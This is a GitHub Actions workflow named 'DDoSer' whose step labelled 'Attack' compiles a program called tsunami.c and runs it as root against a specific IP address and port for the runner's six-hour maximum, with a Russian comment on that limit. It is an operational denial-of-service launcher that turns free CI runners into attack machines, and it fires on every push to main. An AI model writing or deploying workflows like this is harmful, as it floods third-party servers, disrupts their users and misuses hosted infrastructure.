name: DDoSer
on:
  workflow_dispatch:
  push:
    branches: [ main ]

jobs:
  run-main:
    timeout-minutes: 360   # Максимум на GitHub-hosted runner (6 часов)
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Attack
        run: |
          clang -std=c23 -march=native -O3 -o tsunami tsunami.c -pthread
          sudo ./tsunami 162.62.226.157 14107 4







